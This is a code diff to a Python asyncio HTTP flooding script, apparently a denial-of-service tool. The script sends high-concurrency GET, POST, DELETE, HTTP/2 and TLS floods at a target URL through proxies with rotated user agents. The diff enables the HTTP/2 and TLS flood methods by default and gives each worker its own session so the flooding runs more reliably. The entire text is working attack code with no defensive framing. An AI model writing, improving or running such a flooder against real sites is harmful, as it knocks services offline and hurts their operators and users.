@@ -18,7 +18,7 @@ DURATION = int(os.getenv("DURATION", "60"))
 CONCURRENCY = int(os.getenv("CONCURRENCY", "500"))
 REQ_PER_SEC = int(os.getenv("REQ_PER_SEC", "100"))
 PROXY_FILE = os.getenv("PROXY_FILE", "")
-METHODS = os.getenv("METHODS", "GET,POST,DELETE,RESET").split(",")
+METHODS = os.getenv("METHODS", "GET,POST,DELETE,RESET,HTTP2,TLS").split(",")
 WORKERS = int(os.getenv("WORKERS", "10"))
 
 # User agents
@@ -45,27 +45,29 @@ if PROXY_FILE and os.path.exists(PROXY_FILE):
         proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
     print(f"Loaded {len(proxies)} proxies")
 
-# Create connector with optimized settings
-connector = aiohttp.TCPConnector(
-    limit=0,  # No connection limit
-    limit_per_host=0,  # No per-host limit
-    force_close=True,
-    enable_cleanup_closed=True,
-    use_dns_cache=True,
-    ttl_dns_cache=300,
-    family=socket.AF_INET,  # Use IPv4 for faster connections
-    ssl=False
-)
-
 # Create session with optimized settings
 timeout = aiohttp.ClientTimeout(total=5, connect=2)
-session = aiohttp.ClientSession(
-    connector=connector,
-    timeout=timeout,
-    headers={"User-Agent": random.choice(USER_AGENTS)}
-)
 
-async def http_flood(method, url):
+async def create_session():
+    # Create connector with optimized settings
+    connector = aiohttp.TCPConnector(
+        limit=0,  # No connection limit
+        limit_per_host=0,  # No per-host limit
+        force_close=True,
+        enable_cleanup_closed=True,
+        use_dns_cache=True,
+        ttl_dns_cache=300,
+        family=socket.AF_INET,  # Use IPv4 for faster connections
+        ssl=False
+    )
+    
+    return aiohttp.ClientSession(
+        connector=connector,
+        timeout=timeout,
+        headers={"User-Agent": random.choice(USER_AGENTS)}
+    )
+
+async def http_flood(session, method, url):
     global stats
     
     try:
@@ -121,7 +123,7 @@ async def http_flood(method, url):
         stats["error"] += 1
         return None
 
-async def http2_flood(url):
+async def http2_flood(session, url):
     global stats
     
     try:
@@ -176,42 +178,49 @@ async def tls_flood(url):
 async def worker(worker_id):
     global stats
     
+    # Create a session for each worker
+    session = await create_session()
+    
     start_time = time.time()
     last_print = start_time
     last_count = 0
     
-    while time.time() - start_time < DURATION:
-        # Calculate required delay to maintain REQ_PER_SEC
-        current_time = time.time()
-        elapsed = current_time - start_time
-        
-        # Print stats every 5 seconds
-        if current_time - last_print >= 5:
-            rps = (stats["success"] - last_count) / (current_time - last_print)
-            print(f"Worker {worker_id}: RPS: {rps:.1f} | Total: {stats['success']}/{stats['error']} | Methods: {stats['methods']}")
-            last_print = current_time
-            last_count = stats["success"]
-        
-        # Create batch of requests for better performance
-        tasks = []
-        for _ in range(REQ_PER_SEC // WORKERS):
-            method = random.choice(METHODS)
+    try:
+        while time.time() - start_time < DURATION:
+            # Calculate required delay to maintain REQ_PER_SEC
+            current_time = time.time()
+            elapsed = current_time - start_time
             
-            if method in ["GET", "POST", "DELETE", "RESET"]:
-                tasks.append(http_flood(method, TARGET_URL))
-            elif method == "HTTP2":
-                tasks.append(http2_flood(TARGET_URL))
-            elif method == "TLS":
-                tasks.append(tls_flood(TARGET_URL))
-        
-        # Execute all tasks concurrently
-        await asyncio.gather(*tasks, return_exceptions=True)
-        
-        # Calculate delay to maintain rate
-        batch_time = time.time() - current_time
-        target_batch_time = 1.0 / WORKERS  # Each worker handles 1/WORKERS of a second
-        if batch_time < target_batch_time:
-            await asyncio.sleep(target_batch_time - batch_time)
+            # Print stats every 5 seconds
+            if current_time - last_print >= 5:
+                rps = (stats["success"] - last_count) / (current_time - last_print)
+                print(f"Worker {worker_id}: RPS: {rps:.1f} | Total: {stats['success']}/{stats['error']} | Methods: {stats['methods']}")
+                last_print = current_time
+                last_count = stats["success"]
+            
+            # Create batch of requests for better performance
+            tasks = []
+            for _ in range(REQ_PER_SEC // WORKERS):
+                method = random.choice(METHODS)
+                
+                if method in ["GET", "POST", "DELETE", "RESET"]:
+                    tasks.append(http_flood(session, method, TARGET_URL))
+                elif method == "HTTP2":
+                    tasks.append(http2_flood(session, TARGET_URL))
+                elif method == "TLS":
+                    tasks.append(tls_flood(TARGET_URL))
+            
+            # Execute all tasks concurrently
+            await asyncio.gather(*tasks, return_exceptions=True)
+            
+            # Calculate delay to maintain rate
+            batch_time = time.time() - current_time
+            target_batch_time = 1.0 / WORKERS  # Each worker handles 1/WORKERS of a second
+            if batch_time < target_batch_time:
+                await asyncio.sleep(target_batch_time - batch_time)
+    finally:
+        # Ensure session is closed
+        await session.close()
 
 async def main():
     global stats
@@ -224,9 +233,6 @@ async def main():
     # Create workers
     tasks = [worker(i) for i in range(WORKERS)]
     await asyncio.gather(*tasks)
-    
-    # Close session
-    await session.close()
     
     # Print final stats
     elapsed = time.time() - stats["start_time"]
